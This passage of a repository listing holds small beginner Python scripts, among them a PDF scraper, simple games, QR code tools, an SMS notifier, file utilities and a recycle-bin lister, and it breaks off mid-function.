          "type": "blob",
          "size": 1.2294921875,
          "content": "from __future__ import print_function\n\nimport re\n\nimport mechanize\nimport urllib2\n\nbr = mechanize.Browser()\nbr.addheaders = [\n    (\n        \"User-Agent\",\n        \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36\",\n    )\n]\nbr.set_handle_robots(False)\n# For page exploration\npage = input(\"Enter Page No:\")\n# print type(page)\np = urllib2.Request(\n    \"https://www.google.co.in/search?q=gate+psu+2017+ext:pdf&start=\" + page\n)\nht = br.open(p)\ntext = '<cite\\sclass=\"_Rm\">(.+?)</cite>'\npatt = re.compile(text)\nh = ht.read()\nurls = re.findall(patt, h)\nint = 0\nwhile int < len(urls):\n    urls[int] = urls[int].replace(\"<b>\", \"\")\n    urls[int] = urls[int].replace(\"</b>\", \"\")\n    int = int + 1\n\nprint(urls)\n\nfor url in urls:\n    try:\n        temp = url.split(\"/\")\n        q = temp[len(temp) - 1]\n        if \"http\" in url:\n            r = urllib2.urlopen(url)\n        else:\n            r = urllib2.urlopen(\"http://\" + url)\n        file = open(\"psu2\" + q + \".pdf\", \"wb\")\n        file.write(r.read())\n        file.close()\n\n        print(\"Done\")\n    except urllib2.URLError as e:\n        print(\n            \"Sorry there exists a problem with this URL Please Download this Manually \"\n            + str(url)\n        )\n"
        },
        {
          "name": "puttylogs.py",
          "type": "blob",
          "size": 1.5947265625,
          "content": "# Script Name\t\t: puttylogs.py\n# Author\t\t\t\t: Craig Richards\n# Created\t\t\t\t: 13th October 2011\n# Last Modified\t\t: 29th February 2012\n# Version\t\t\t\t: 1.2\n\n# Modifications\t\t: 1.1 - Added the variable zip_program so you can set it for the zip program on whichever OS, so to run on a different OS just change the locations of these two variables.\n# \t\t\t\t\t\t\t: 1.2 - 29-02-12 - CR - Added shutil module and added one line to move the zipped up logs to the zipped_logs directory\n\n# Description\t\t\t: Zip up all the logs in the given directory\n\nimport os  # Load the Library Module\nimport shutil  # Load the Library Module - 1.2\nfrom time import strftime  # Load just the strftime Module from Time\n\nlogsdir = \"c:\\logs\\puttylogs\"  # Set the Variable logsdir\nzipdir = \"c:\\logs\\puttylogs\\zipped_logs\"  # Set the Variable zipdir - 1.2\nzip_program = \"zip.exe\"  # Set the Variable zip_program - 1.1\n\nfor files in os.listdir(logsdir):  # Find all the files in the directory\n    if files.endswith(\".log\"):  # Check to ensure the files in the directory end in .log\n        files1 = (\n            files + \".\" + strftime(\"%Y-%m-%d\") + \".zip\"\n        )  # Create the Variable files1, this is the files in the directory, then we add a suffix with the date and the zip extension\n        os.chdir(logsdir)  # Change directory to the logsdir\n        os.system(\n            zip_program + \" \" + files1 + \" \" + files\n        )  # Zip the logs into dated zip files for each server. - 1.1\n        shutil.move(\n            files1, zipdir\n        )  # Move the zipped log files to the zipped_logs directory - 1.2\n        os.remove(files)  # Remove the original log files\n"
        },
        {
          "name": "pyauto.py",
          "type": "blob",
          "size": 0.5869140625,
          "content": "# Author-Slayking1965\n# email-kingslayer8509@gmail.com\nimport random\nimport pyautogui\nimport string\n\n\nchars = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\"\n\nchars = string.printable\nchars_list = list(chars)\n\n\npassword = pyautogui.password(\"Enter a password : \")\n\nguess_password = \"\"\n\nwhile guess_password != password:\n    guess_password = random.choices(chars_list, k=len(password))\n\n    print(\"<==================\" + str(guess_password) + \"==================>\")\n\n    if guess_password == list(password):\n        print(\"Your password is : \" + \"\".join(guess_password))\n        break\n"
        },
        {
          "name": "pygame.py",
          "type": "blob",
          "size": 1.853515625,
          "content": "# author-slayking1965\n\"\"\"\nThis is a game very similar to stone paper scissor\nIn this game :\nif computer chooses snake and user chooses water, the snake will drink water and computer wins.\nIf computer chooses gun and user chooses water, the gun gets drown into water and user wins.\nAnd so on for other cases\n\"\"\"\n\nimport random\nimport time\n\nchoices = {\"S\": \"Snake\", \"W\": \"Water\", \"G\": \"Gun\"}\n\nx = 0\ncom_win = 0\nuser_win = 0\nmatch_draw = 0\n\nprint(\"Welcome to the Snake-Water-Gun Game\\n\")\nprint(\"I am Mr. Computer, We will play this game 10 times\")\nprint(\"Whoever wins more matches will be the winner\\n\")\n\nwhile x < 10:\n    print(f\"Game No. {x+1}\")\n    for key, value in choices.items():\n        print(f\"Choose {key} for {value}\")\n\n    com_choice = random.choice(list(choices.keys())).lower()\n    user_choice = input(\"\\n----->\").lower()\n\n    if user_choice == \"s\" and com_choice == \"w\":\n        com_win += 1\n\n    elif user_choice == \"s\" and com_choice == \"g\":\n        com_win += 1\n\n    elif user_choice == \"w\" and com_choice == \"s\":\n        user_win += 1\n\n    elif user_choice == \"g\" and com_choice == \"s\":\n        user_win += 1\n\n    elif user_choice == \"g\" and com_choice == \"w\":\n        com_win += 1\n\n    elif user_choice == \"w\" and com_choice == \"g\":\n        user_win += 1\n\n    elif user_choice == com_choice:\n        match_draw += 1\n\n    else:\n        print(\"\\n\\nYou entered wrong !!!!!!\")\n        x = 0\n        print(\"Restarting the game\")\n        print(\"\")\n        time.sleep(1)\n        continue\n\n    x += 1\n    print(\"\\n\")\n\n\nprint(\"Here are final stats of the 10 matches : \")\nprint(f\"Mr. Computer won : {com_win} matches\")\nprint(f\"You won : {user_win} matches\")\nprint(f\"Matches Drawn : {match_draw}\")\n\nif com_win > user_win:\n    print(\"\\n-------Mr. Computer won-------\")\n\nelif com_win < user_win:\n    print(\"\\n-----------You won-----------\")\n\nelse:\n    print(\"\\n----------Match Draw----------\")\n"
        },
        {
          "name": "pyhton_array.py",
          "type": "blob",
          "size": 0.107421875,
          "content": "from array import *\n\narray1 = array(\"i\", [10, 20, 30, 40, 50])\n\narray1[2] = 80\n\nfor x in array1:\n    print(x)\n"
        },
        {
          "name": "pythagoreanTriplets.py",
          "type": "blob",
          "size": 0.30078125,
          "content": "limit = int(input(\"Enter upper limit:\"))\nc = 0\nm = 2\nwhile c < limit:\n    for n in range(1, m + 1):\n        a = m * m - n * n\n        b = 2 * m * n\n        c = m * m + n * n\n        if c > limit:\n            break\n        if a == 0 or b == 0 or c == 0:\n            break\n        print(a, b, c)\n    m = m + 1\n"
        },
        {
          "name": "python Space Invader game.py",
          "type": "blob",
          "size": 4.142578125,
          "content": "import pygame\nimport random\nimport math\nfrom pygame import mixer\n\n# initialization\n\npygame.init()\n\n# create the screen\nscreen = pygame.display.set_mode((800, 620))\n\n# background\n\nbackground = pygame.image.load('background.png')\n\n#bg sound\nmixer.music.load('background.wav')\nmixer.music.play(-1)\n\n# title and icon\npygame.display.set_caption(\"Space Invendera\")\nicon = pygame.image.load('battleship.png')\npygame.display.set_icon(icon)\n\n# player\nplayerimg = pygame.image.load('transport.png')\nplayerx = 370\nplayery = 480\nplayerx_change = 0\n\n# enemy\nenemyimg = []\nenemyx = []\nenemyy = []\nenemyx_change = []\nenemyy_change = []\nnumber_of_enemies = 6\n\nfor i in range(number_of_enemies):\n    enemyimg.append(pygame.image.load('enemy.png'))\n    enemyx.append(random.randint(0, 800))\n    enemyy.append(random.randint(50, 150))\n    enemyx_change.append(2.5)\n    enemyy_change.append(40)\n\n# bullet\nbulletimg = pygame.image.load('bullet.png')\nbulletx = 0\nbullety = 480\nbulletx_change = 0\nbullety_change = 10\nbullet_state = \"ready\"\n\n#score\nscore_value = 0\nfont = pygame.font.Font('freesansbold.ttf',32)\ntextx = 10\ntexty = 10\n\n#game over txt\nover_font = pygame.font.Font('freesansbold.ttf',64)\n\ndef show_score(x ,y):\n    score = font.render(\"score :\"+ str(score_value),True, (255, 255, 255))\n    screen.blit(score, (x, y))\n\ndef game_over_text():\n    over_txt = over_font.render(\"GAME OVER\", True, (255, 255, 255))\n    screen.blit(over_txt, (200, 250))\n\n# for display player img\ndef player(x, y):\n    screen.blit(playerimg, (x, y))\n\n\n# foe desplaing enemy img\n\ndef enemy(x, y ,i):\n    screen.blit(enemyimg[i], (x, y))\n\n\ndef fire_bullet(x, y):\n    global bullet_state\n    bullet_state = \"fire\"\n    screen.blit(bulletimg, (x + 16, y + 10))\n\n\ndef iscollision(enemyx, enemyy, bulletx, bullety):\n    distance = math.sqrt((math.pow(enemyx - bulletx, 2)) + (math.pow(enemyy - bullety, 2)))\n    if distance < 27:\n        return True\n    else:\n        return False\n\n\n# game loop\nrunning = True\nwhile running:\n\n    screen.fill((0, 0, 0))\n    # for bg img\n    screen.blit(background, (0, 0))\n\n    for event in pygame.event.get():\n        if event.type == pygame.QUIT:\n            running = False\n\n        # if keystroke in pressed whether it is right of left\n        if (event.type == pygame.KEYDOWN):\n            if (event.key == pygame.K_LEFT):\n                playerx_change = -5\n            if (event.key == pygame.K_RIGHT):\n                playerx_change = 5\n\n            if (event.key == pygame.K_SPACE):\n                if bullet_state == \"ready\":\n                    bullet_sound = mixer.Sound('laser.wav')\n                    bullet_sound.play()\n                    bulletx = playerx\n                    fire_bullet(bulletx, bullety)\n\n        if (event.type == pygame.KEYUP):\n            if event.key == pygame.K_LEFT or event.key == pygame.K_RIGHT:\n                playerx_change = 0\n\n    playerx += playerx_change\n    # create boundry for player\n    if playerx <= 0:\n        playerx = 0\n    elif playerx >= 736:\n        playerx = 736\n\n    for i in range(number_of_enemies):\n\n        #game over\n        if enemyy[i] > 440:\n            for j in range(number_of_enemies):\n                enemyy[j] = 2000\n            game_over_text()\n            break\n\n        enemyx[i] += enemyx_change[i]\n        # create boundry for enemy\n        if enemyx[i] <= 0:\n            enemyx_change[i] = 2.5\n            enemyy[i] += enemyy_change[i]\n        elif enemyx[i] >= 736:\n            enemyx_change[i] = -2.5\n            enemyy[i] += enemyy_change[i]\n\n        # collision\n        collision = iscollision(enemyx[i], enemyy[i], bulletx, bullety)\n        if collision:\n            explossion_sound = mixer.Sound('explosion.wav')\n            explossion_sound.play()\n            bullety = 480\n            bullet_state = \"ready\"\n            score_value += 1\n            enemyx[i] = random.randint(0, 800)\n            enemyy[i] = random.randint(50, 150)\n\n        enemy(enemyx[i], enemyy[i], i)\n\n    # bullet movement\n    if bullety <= 0:\n        bullety = 480\n        bullet_state = \"ready\"\n\n    if bullet_state == \"fire\":\n        fire_bullet(bulletx, bullety)\n        bullety -= bullety_change\n\n    player(playerx, playery)\n    show_score(textx,texty)\n    pygame.display.update()\n"
        },
        {
          "name": "python program for finding square root for positive number.py",
          "type": "blob",
          "size": 0.255859375,
          "content": "# Python Program to calculate the square root\n\n# Note: change this value for a different result\nnum = 8 \n\n# To take the input from the user\n#num = float(input('Enter a number: '))\n\nnum_sqrt = num ** 0.5\nprint('The square root of %0.3f is %0.3f'%(num ,num_sqrt))\n"
        },
        {
          "name": "pythonVideoDownloader.py",
          "type": "blob",
          "size": 1.6328125,
          "content": "import requests\nfrom bs4 import BeautifulSoup\n\n\"\"\"\nURL of the archive web-page which provides link to\nall video lectures. It would have been tiring to\ndownload each video manually.\nIn this example, we first crawl the webpage to extract\nall the links and then download videos.\n\"\"\"\n\n# specify the URL of the archive here\narchive_url = \"http://www-personal.umich.edu/~csev/books/py4inf/media/\"\n\n\ndef get_video_links():\n    # create response object\n    r = requests.get(archive_url)\n\n    # create beautiful-soup object\n    soup = BeautifulSoup(r.content, \"html5lib\")\n\n    # find all links on web-page\n    links = soup.findAll(\"a\")\n\n    # filter the link sending with .mp4\n    video_links = [\n        archive_url + link[\"href\"] for link in links if link[\"href\"].endswith(\"mp4\")\n    ]\n\n    return video_links\n\n\ndef download_video_series(video_links):\n    for link in video_links:\n\n        \"\"\"iterate through all links in video_links\n        and download them one by one\"\"\"\n\n        # obtain filename by splitting url and getting\n        # last string\n        file_name = link.split(\"/\")[-1]\n\n        print(\"Downloading the file:%s\" % file_name)\n\n        # create response object\n        r = requests.get(link, stream=True)\n\n        # download started\n        with open(file_name, \"wb\") as f:\n            for chunk in r.iter_content(chunk_size=1024 * 1024):\n                if chunk:\n                    f.write(chunk)\n\n        print(\"%s downloaded!\\n\" % file_name)\n\n    print(\"All videos are downloaded!\")\n    return\n\n\nif __name__ == \"__main__\":\n    # getting all video links\n    video_links = get_video_links()\n\n    # download all videos\n    download_video_series(video_links)\n"
        },
        {
          "name": "python_codes",
          "type": "blob",
          "size": 0.0283203125,
          "content": "python_codes\nprint(\"Python\")\n"
        },
        {
          "name": "python_sms.py",
          "type": "blob",
          "size": 2.1513671875,
          "content": "from __future__ import print_function\n\nimport os\nimport sqlite3\nimport urllib  # URL functions\nfrom time import strftime\n\nimport urllib2  # URL functions\n\n# Script Name\t: python_sms.py\n# Author\t: Craig Richards\n# Created\t: 16th February 2017\n# Last Modified\t:\n# Version\t: 1.0\n# Modifications\t:\n# Description\t: This will text all the students Karate Club\n\ndropbox = os.getenv(\"dropbox\")\nscripts = os.getenv(\"scripts\")\ndbfile = \"database/maindatabase.db\"\nmaster_db = os.path.join(dropbox, dbfile)\n\nf = open(scripts + \"/output/student.txt\", \"a\")\n\ntdate = strftime(\"%d-%m\")\n\nconn = sqlite3.connect(master_db)\ncursor = conn.cursor()\nloc_stmt = \"SELECT name, number from table\"\ncursor.execute(loc_stmt)\nwhile True:\n    row = cursor.fetchone()\n    if row == None:\n        break\n    sname = row[0]\n    snumber = row[1]\n\n    message = (\n        f\"{sname} There will be NO training tonight on the {tdate}. Sorry for the late notice, I have sent a mail as well, just trying to reach everyone, please do not reply to this message as this is automated\"\n    )\n\n    username = \"YOUR_USERNAME\"\n    sender = \"WHO_IS_SENDING_THE_MAIL\"\n\n    hash = \"YOUR HASH YOU GET FROM YOUR ACCOUNT\"\n\n    numbers = snumber\n\n    # Set flag to 1 to simulate sending, this saves your credits while you are testing your code. # To send real message set this flag to 0\n    test_flag = 0\n\n    # -----------------------------------\n    # No need to edit anything below this line\n    # -----------------------------------\n\n    values = {\n        \"test\": test_flag,\n        \"uname\": username,\n        \"hash\": hash,\n        \"message\": message,\n        \"from\": sender,\n        \"selectednums\": numbers,\n    }\n\n    url = \"http://www.txtlocal.com/sendsmspost.php\"\n\n    postdata = urllib.urlencode(values)\n    req = urllib2.Request(url, postdata)\n\n    print( f\"Attempting to send SMS to {sname} at {snumber} on {tdate}\")\n    f.write(\n        f\"Attempting to send SMS to {sname} at {snumber} on {tdate}\"\n    )\n\n    try:\n        response = urllib2.urlopen(req)\n        response_url = response.geturl()\n        if response_url == url:\n            print(\"SMS sent!\")\n    except urllib2.URLError as e:\n        print(\"Send failed!\")\n        print(e.reason)\n"
        },
        {
          "name": "python_webscraper.py",
          "type": "blob",
          "size": 0.560546875,
          "content": "import requests\nfrom bs4 import BeautifulSoup\n# Make a request on to your website\npage = requests.get(\"Paste your Website Domain here\")\nsoup = BeautifulSoup(page.content, 'html.parser')\n\n# Create all_h1_tags as empty list\nall_h1_tags = []\n\n# Set all_h1_tags to all h1 tags of the soup\nfor element in soup.select('h1'):\n    all_h1_tags.append(element.text)\n\n# Create seventh_p_text and set it to 7th p element text of the page\nseventh_p_text = soup.select('p')[6].text\n\nprint(all_h1_tags, seventh_p_text)\n\n# print all h1 elements and the text of the website on your console \n"
        },
        {
          "name": "qrcode.py",
          "type": "blob",
          "size": 0.2080078125,
          "content": "# importing Required Modules\nimport qrcode\n\n# QR Code Generator\nquery = input(\"Enter Content: \")  # Enter Content\ncode = qrcode.make(query)  # Making the QR code\ncode.save(\"qrcode.png\")  # Saving the QR code file\n"
        },
        {
          "name": "qrdecoder.py",
          "type": "blob",
          "size": 0.27734375,
          "content": "# Importing Required Modules\nimport cv2\n\n# QR Code Decoder\n\nfilename = input()\nimage = cv2.imread(filename)  # Enter name of the image\ndetector = cv2.QRCodeDetector()\ndata, vertices_array, binary_qrcode = detector.detectAndDecode(image)\nif vertices_array is not None:\n    print(data)\n"
        },
        {
          "name": "quiz_game.py",
          "type": "blob",
          "size": 0.9111328125,
          "content": "print('Welcome to AskPython Quiz')\nanswer=input('Are you ready to play the Quiz ? (yes/no) :')\nscore=0\ntotal_questions=3\n \nif answer.lower()=='yes':\n    answer=input('Question 1: What is your Favourite programming language?')\n    if answer.lower()=='python':\n        score += 1\n        print('correct')\n    else:\n        print('Wrong Answer :(')\n \n \n    answer=input('Question 2: Do you follow any author on AskPython? ')\n    if answer.lower()=='yes':\n        score += 1\n        print('correct')\n    else:\n        print('Wrong Answer :(')\n \n    answer=input('Question 3: What is the name of your favourite website for learning Python?')\n    if answer.lower()=='askpython':\n        score += 1\n        print('correct')\n    else:\n        print('Wrong Answer :(')\n \nprint('Thankyou for Playing this small quiz game, you attempted',score,\"questions correctly!\")\nmark=(score/total_questions)*100\nprint('Marks obtained:',mark)\nprint('BYE!')"
        },
        {
          "name": "quote.py",
          "type": "blob",
          "size": 0.44921875,
          "content": "# Sends inspirational quotes to the user using Zen Quotes API\n\n# Format\n\"\"\"\nexample quote -Quote Author Name\n\"\"\"\n\nimport requests\nfrom json import loads\n\n\ndef return_quote():\n    response = requests.get(\"https://zenquotes.io/api/random\")\n    json_data = loads(response.text)\n    quote = (\n        json_data[0][\"q\"] + \" -\" + json_data[0][\"a\"]\n    )  # aligning the quote and it's author name in one string\n    return quote\n\n\nquote = return_quote()\nprint(quote)\n"
        },
        {
          "name": "random-sentences.py",
          "type": "blob",
          "size": 1.15625,
          "content": "\"\"\"Generates Random Sentences\nCreates a sentence by selecting a word at randowm from each of the lists in\nthe following order: 'article', 'nounce', 'verb', 'preposition',\n'article' and 'noun'.\nThe second part produce a short story consisting of several of\nthese sentences -- Random Note Writer!!\"\"\"\n\nimport random\n\narticle = [\"the\", \"a\", \"one\", \"some\", \"any\"]\nnoun = [\"boy\", \"girl\", \"dog\", \"town\", \"car\"]\nverb = [\"drove\", \"jumped\", \"ran\", \"walked\", \"skipped\"]\npreposition = [\"to\", \"from\", \"over\", \"under\", \"on\"]\n\n\ndef random_int():\n    return random.randint(0, 4)\n\n\ndef random_sentence():\n    \"\"\"Creates random and return sentences.\"\"\"\n    return (\n        \"{} {} {} {} {} {}\".format(\n            article[random_int()],\n            noun[random_int()],\n            verb[random_int()],\n            preposition[random_int()],\n            article[random_int()],\n            noun[random_int()],\n        )\n    ).capitalize()\n\n\n# prints random sentences\nfor sentence in list(map(lambda x: random_sentence(), range(0, 20))):\n    print(sentence)\n\nprint(\"\\n\")\n\nstory = (\". \").join(list(map(lambda x: random_sentence(), range(0, 20))))\n\n# prints random sentences story\nprint(\"{}\".format(story))\n"
        },
        {
          "name": "random_file_move.py",
          "type": "blob",
          "size": 1.7666015625,
          "content": "# Script Name   : random_file_move.py\n# Author(s)     : Akash Jain\n# Created       : 1 September 2020\n# Last Modified : 1 September 2020\n# Version       : 1.0\n# Description   : This will move specified number of files(given in ratio) from the src directory to dest directory.\n\n\nimport os, random\nimport argparse\n\n\ndef check_ratio(x):\n    try:\n        x = float(x)\n    except ValueError:\n        raise argparse.ArgumentTypeError(\"%r not a floating-point literal\" % (x,))\n\n    if x < 0.0 or x > 1.0:\n        raise argparse.ArgumentTypeError(\"%r not in range [0.0, 1.0]\" % (x))\n    return x\n\n\ndesc = \"Script to move specified number of files(given in ratio) from the src directory to dest directory.\"\nusage = \"python random_file_move.py -src [SRC] -dest [DEST] -ratio [RATIO]\"\n\nparser = argparse.ArgumentParser(usage=usage, description=desc)\nparser.add_argument(\n    \"-src\",\n    \"--src\",\n    type=str,\n    required=True,\n    help=\"(REQUIRED) Path to directory from which we cut files. Space not allowed in path.\",\n)\nparser.add_argument(\n    \"-dest\",\n    \"--dest\",\n    type=str,\n    required=True,\n    help=\"(REQUIRED) Path to directory to which we move files. Space not allowed in path.\",\n)\nparser.add_argument(\n    \"-ratio\",\n    \"--ratio\",\n    type=check_ratio,\n    required=True,\n    help=\"(REQUIRED) Ratio of files in 'src' and 'dest' directory.\",\n)\n\nargs = parser.parse_args()\n\nsrc = args.src\ndest = args.dest\nratio = args.ratio\n\nfiles = os.listdir(src)\nsize = int(ratio * len(files))\n\nprint(\"Move {} files from {} to {} ? [y/n]\".format(size, src, dest))\nif input().lower() == \"y\":\n    for f in random.sample(files, size):\n        try:\n            os.rename(os.path.join(src, f), os.path.join(dest, f))\n        except Exception as e:\n            print(e)\n    print(\"Successful\")\nelse:\n    print(\"Cancelled\")\n"
        },
        {
          "name": "randomloadingmessage.py",
          "type": "blob",
          "size": 5.705078125,
          "content": "# Created by Nathan R (Mosrod)\n# CREDIT TO https://github.com/1egoman/funnies/blob/master/src/funnies.js\n\nfrom random import *\n\nx = 1\n\nfor i in range(x):\n    num = randint(1, 80)\n    if num == 1:\n        print(\"Reticulating splines...\")\n    if num == 2:\n        print(\"Swapping time and space...\")\n    if num == 3:\n        print(\"Spinning violently around the y-axis...\")\n    if num == 4:\n        print(\"Tokenizing real life...\")\n    if num == 5:\n        print(\"Bending the spoon...\")\n    if num == 6:\n        print(\"Filtering morale...\")\n    if num == 7:\n        print(\"We need a new fuse...\")\n    if num == 8:\n        print(\"Have a good day.\")\n    if num == 9:\n        print(\n            \"Upgrading Windows, your PC will restart several times. Sit back and relax.\"\n        )\n    if num == 10:\n        print(\"The architects are still drafting.\")\n    if num == 11:\n        print(\"We're building the buildings as fast as we can.\")\n    if num == 12:\n        print(\"Please wait while the little elves draw your map.\")\n    if num == 13:\n        print(\"Don't worry - a few bits tried to escape, but we caught them.\")\n    if num == 14:\n        print(\"Go ahead -- hold your breath!\")\n    if num == 15:\n        print(\"...at least you're not on hold...\")\n    if num == 16:\n        print(\"The server is powered by a lemon and two electrodes.\")\n    if num == 17:\n        print(\"We're testing your patience.\")\n    if num == 18:\n        print(\"As if you had any other choice.\")\n    if num == 19:\n        print(\"The bits are flowing slowly today.\")\n    if num == 20:\n        print(\"It's still faster than you could draw it.\")\n    if num == 21:\n        print(\"My other loading screen is much faster.\")\n    if num == 22:\n        print(\"(Insert quarter)\")\n    if num == 23:\n        print(\"Are we there yet?\")\n    if num == 24:\n        print(\"Just count to 10.\")\n    if num == 25:\n        print(\"Don't panic...\")\n    if num == 26:\n        print(\"We're making you a cookie.\")\n    if num == 27:\n        print(\"Creating time-loop inversion field.\")\n    if num == 28:\n        print(\"Computing chance of success.\")\n    if num == 29:\n        print(\"All I really need is a kilobit.\")\n    if num == 30:\n        print(\"I feel like im supposed to be loading something...\")\n    if num == 31:\n        print(\"Should have used a compiled language...\")\n    if num == 32:\n        print(\"Is this Windows?\")\n    if num == 33:\n        print(\"Don't break your screen yet!\")\n    if num == 34:\n        print(\"I swear it's almost done.\")\n    if num == 35:\n        print(\"Let's take a mindfulness minute...\")\n    if num == 36:\n        print(\"Listening for the sound of one hand clapping...\")\n    if num == 37:\n        print(\"Keeping all the 1's and removing all the 0's...\")\n    if num == 38:\n        print(\"We are not liable for any broken screens as a result of waiting.\")\n    if num == 39:\n        print(\"Where did all the internets go?\")\n    if num == 40:\n        print(\"Granting wishes...\")\n    if num == 41:\n        print(\"Time flies when you’re having fun.\")\n    if num == 42:\n        print(\"Get some coffee and come back in ten minutes...\")\n    if num == 43:\n        print(\"Stay awhile and listen...\")\n    if num == 44:\n        print(\"Convincing AI not to turn evil...\")\n    if num == 45:\n        print(\"How did you get here?\")\n    if num == 46:\n        print(\"Wait, do you smell something burning?\")\n    if num == 47:\n        print(\"Computing the secret to life, the universe, and everything.\")\n    if num == 48:\n        print(\"When nothing is going right, go left...\")\n    if num == 49:\n        print(\"I love my job only when I'm on vacation...\")\n    if num == 50:\n        print(\"Why are they called apartments if they are all stuck together?\")\n    if num == 51:\n        print(\"I’ve got problem for your solution...\")\n    if num == 52:\n        print(\"Whenever I find the key to success, someone changes the lock.\")\n    if num == 53:\n        print(\"Constructing additional pylons...\")\n    if num == 54:\n        print(\"You don’t pay taxes—they take taxes.\")\n    if num == 55:\n        print(\"A commit a day keeps the mobs away.\")\n    if num == 56:\n        print(\"This is not a joke, it's a commit.\")\n    if num == 57:\n        print(\"Hello IT, have you tried turning it off and on again?\")\n    if num == 58:\n        print(\"Hello, IT... Have you tried forcing an unexpected reboot?\")\n    if num == 59:\n        print(\"I didn't choose the engineering life. The engineering life chose me.\")\n    if num == 60:\n        print(\"Dividing by zero...\")\n    if num == 61:\n        print(\"If I’m not back in five minutes, just wait longer.\")\n    if num == 62:\n        print(\"Web developers do it with <style>\")\n    if num == 63:\n        print(\"Cracking military-grade encryption...\")\n    if num == 64:\n        print(\"Entangling superstrings...\")\n    if num == 65:\n        print(\"Looking for sense of humour, please hold on.\")\n    if num == 66:\n        print(\"A different error message? Finally, some progress!\")\n    if num == 67:\n        print(\"Please hold on as we reheat our coffee.\")\n    if num == 68:\n        print(\"Kindly hold on as we convert this bug to a feature...\")\n    if num == 69:\n        print(\"Kindly hold on as our intern quits vim...\")\n    if num == 71:\n        print(\"Winter is coming...\")\n    if num == 72:\n        print(\"Installing dependencies.\")\n    if num == 73:\n        print(\"Switching to the latest JS framework...\")\n    if num == 74:\n        print(\"Let's hope it's worth the wait.\")\n    if num == 75:\n        print(\"Aw, snap! Not...\")\n    if num == 76:\n        print(\"Ordering 1s and 0s...\")\n    if num == 77:\n        print(\"Updating dependencies...\")\n    if num == 78:\n        print(\"Please wait... Consulting the manual...\")\n    if num == 79:\n        print(\"Loading funny message...\")\n    if num == 80:\n        print(\"Feel free to spin in your chair.\")\n"
        },
        {
          "name": "rangoli.py",
          "type": "blob",
          "size": 1.029296875,
          "content": "\"\"\"Rangoli Model\"\"\"\n\n\n# Prints a rangoli of size n\ndef print_rangoli(n):\n    \"\"\"Prints a rangoli of size n\"\"\"    \n    # Width of the rangoli\n    width = 4 * n - 3\n\n    # String to be printed\n    string = \"\"\n\n    # Loop to print the rangoli\n    for i in range(1, n + 1):\n        for j in range(0, i):\n            string += chr(96 + n - j)\n            if len(string) < width:\n                string += \"-\"\n\n        for k in range(i - 1, 0, -1):\n            string += chr(97 + n - k)\n            if len(string) < width:\n                string += \"-\"\n\n        print(string.center(width, \"-\"))\n        string = \"\"\n\n    for i in range(n - 1, 0, -1):\n        for j in range(0, i):\n            string += chr(96 + n - j)\n            if len(string) < width:\n                string += \"-\"\n\n        for k in range(i - 1, 0, -1):\n            string += chr(97 + n - k)\n            if len(string) < width:\n                string += \"-\"\n\n        print(string.center(width, \"-\"))\n        string = \"\"\n\n\nif __name__ == '__main__':\n    n = int(input())\n    print_rangoli(n)\n"
        },
        {
          "name": "read_excel_file.py",
          "type": "blob",
          "size": 0.61328125,
          "content": "# extract number of rows using Python\r\nimport xlrd\r\n\r\n# Give the location of the file\r\nloc = \"sample.xlsx\"\r\nwb = xlrd.open_workbook(loc)\r\nsheet = wb.sheet_by_index(0)\r\nsheet.cell_value(0, 0)\r\n# Extracting number of rows\r\nprint(sheet.nrows)\r\n\r\n# extract number of columns in Python\r\nprint(sheet.ncols)\r\n\r\n# extracting all columns name in Python\r\nfor i in range(sheet.ncols):\r\n    print(sheet.cell_value(0, i))\r\n\r\n# extracting first column\r\nsheet = wb.sheet_by_index(0)\r\nfor i in range(sheet.nrows):\r\n    print(sheet.cell_value(i, 0))\r\n\r\n# extract a particular row value\r\nsheet = wb.sheet_by_index(0)\r\nprint(sheet.row_values(1))\r\n"
        },
        {
          "name": "rearrange-files",
          "type": "tree",
          "content": null
        },
        {
          "name": "recursive-fibonacci.py",
          "type": "blob",
          "size": 0.1005859375,
          "content": "def fib(n):\n    if n == 0 or n == 1:\n        return n\n    else:\n        return fib(n - 1) + fib(n - 2)\n"
        },
        {
          "name": "recursiveStrings.py",
          "type": "blob",
          "size": 0.9453125,
          "content": "\"\"\" author: Ataba29 \ncode has a matrix each list inside of the matrix has two strings\nthe code determines if the two strings are similar or different \nfrom each other recursively\n\"\"\"\n\n\ndef CheckTwoStrings(str1, str2):\n    # function takes two strings and check if they are similar\n    # returns True if they are identical and False if they are different\n\n    if(len(str1) != len(str2)):\n        return False\n    if(len(str1) == 1 and len(str2) == 1):\n        return str1[0] == str2[0]\n\n    return (str1[0] == str2[0]) and CheckTwoStrings(str1[1:], str2[1:])\n\n\ndef main():\n    matrix = [[\"hello\", \"wow\"], [\"ABSD\", \"ABCD\"],\n              [\"List\", \"List\"], [\"abcspq\", \"zbcspq\"],\n              [\"1263\", \"1236\"], [\"lamar\", \"lamars\"],\n              [\"amczs\", \"amczs\"], [\"yeet\", \"sheesh\"], ]\n\n    for i in matrix:\n        if CheckTwoStrings(i[0], i[1]):\n            print(f\"{i[0]},{i[1]} are similar\")\n        else:\n            print(f\"{i[0]},{i[1]} are different\")\n\n\nmain()\n"
        },
        {
          "name": "recyclebin.py",
          "type": "blob",
          "size": 1.513671875,
          "content": "from __future__ import print_function\n\nimport os  # Load the Module\n\nfrom _winreg import *  # Load the Module\n\n\n# Script Name\t\t: recyclebin.py\n# Author\t\t\t\t: Craig Richards\n# Created\t\t\t\t: 07th June 2013\n# Last Modified\t\t:\n# Version\t\t\t\t: 1.0\n# Modifications\t\t:\n# Description\t\t\t: Scans the recyclebin and displays the files in there, originally got this script from the Violent Python book\n\n\ndef sid2user(sid):  # Start of the function to gather the user\n    try:\n        key = OpenKey(\n            HKEY_LOCAL_MACHINE,\n            \"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\" + \"\\\\\" + sid,\n        )\n        (value, type) = QueryValueEx(key, \"ProfileImagePath\")\n        user = value.split(\"\\\\\")[-1]\n        return user\n    except Exception:\n        return sid\n\n\ndef returnDir():  # Start of the function to search through the recyclebin\n    dirs = [\"c:\\\\Recycler\\\\\", \"C:\\\\Recycled\\\\\", \"C:\\\\$RECYCLE.BIN\\\\\"]\n    # dirs=['c:\\\\$RECYCLE.BIN\\\\']\n    for recycleDir in dirs:\n        if os.path.isdir(recycleDir):\n            return recycleDir\n    return None\n\n\ndef findRecycled(\n    recycleDir,\n):  # Start of the function, list the contents of the recyclebin\n    